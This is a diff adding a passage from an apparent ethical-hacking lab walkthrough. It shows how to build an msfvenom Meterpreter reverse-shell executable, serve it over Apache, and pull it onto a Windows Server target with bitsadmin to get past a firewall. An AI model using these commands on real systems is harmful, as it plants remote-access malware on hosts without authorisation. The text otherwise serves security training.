@@ -1,0 +1,27 @@
+Evading IDS, Firewalls, and Honeypots
+
+
+Evade Firewall through Windows BITSAdmin
+
+ type msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe and press Enter, to create the payload.
+ 
+ 	9. Now, create a directory to share this file with the target machine, provide the permissions, and copy the file from /home/attacker to the shared location using the below commands:
+	• Type mkdir /var/www/html/share and press Enter to create a shared folder
+	• Type chmod -R 755 /var/www/html/share and press Enter
+	• Type chown -R www-data:www-data /var/www/html/share and press Enter
+	• Copy the malicious file to the shared location by typing cp Exploit.exe /var/www/html/share and pressing Enter
+	
+
+
+
+	10. Now, start the Apache service. To do this, run service apache2 start command.
+	
+
+
+	11. Click Windows Server 2019 to switch to Windows Server 2019 machine.
+	12. In the Type here to search field of the Desktop, type powershell and click Windows PowerShell to launch a PowerShell.
+	13. In the PowerShell window, type bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe and press Enter.
+	
+
+
+	14. BITSAdmin transfers the file, as shown in the screenshot.
